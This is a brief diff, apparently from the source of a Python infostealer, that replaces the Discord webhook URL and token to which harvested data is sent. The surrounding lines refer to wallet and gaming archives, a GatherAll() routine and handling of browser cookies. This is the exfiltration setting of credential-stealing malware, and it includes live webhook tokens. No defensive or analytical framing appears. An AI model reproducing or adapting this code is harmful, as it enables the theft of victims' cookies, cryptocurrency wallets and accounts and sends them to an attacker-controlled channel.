@@ -886,7 +886,7 @@ WalletsZip = [] # [Name, Link]
 GamingZip = []
 OtherZip = []
 
-hook = "https://discordapp.com/api/webhooks/1235068286312648755/KXeWMyQne-9DMDbFrtlIvV0iJu2BkjJM1xLBHJ1ntc5k7hB9eAOXAAfQOm6BixpBCNr2"
+hook = "https://discordapp.com/api/webhooks/1235068880464908390/ckM-PxJ8Y7386wrc1M-O63J9SiTFd_5lqUGeIpPrJMu3DibC1G_UtO2z1tY4Bi0Q2uKQ"
 
 GatherAll()
 DETECTED = Trust(Cookies)
